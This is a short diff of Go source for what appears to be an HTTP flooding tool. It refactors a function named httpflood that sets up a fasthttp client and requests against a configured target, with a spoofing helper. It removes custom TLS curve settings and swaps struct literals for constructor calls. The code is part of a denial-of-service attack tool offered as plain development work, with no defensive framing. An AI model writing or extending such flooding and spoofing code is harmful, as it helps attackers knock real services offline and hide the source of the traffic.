@@ -1,7 +1,6 @@
 package main
 
 import(
-  "crypto/tls"
   "log"
   "os"
   "strconv"
@@ -17,9 +16,9 @@ var target struct{
 }
 
 func httpflood(){
-  head := header{"false", nil}
-  sp := spoof{"127.0.0.1", 5}
-  client := &fasthttp.Client{TLSConfig: &tls.Config{CurvePreferences: []tls.CurveID{tls.CurveP256, tls.CurveP384, tls.CurveP521, tls.X25519}}}
+  head := NewHeader(false, nil)
+  sp := NewSpoof(5)
+  client := &fasthttp.Client{}
   req := fasthttp.AcquireRequest()
   req.SetRequestURI(target.url)
   req.Header.SetMethod(target.method)
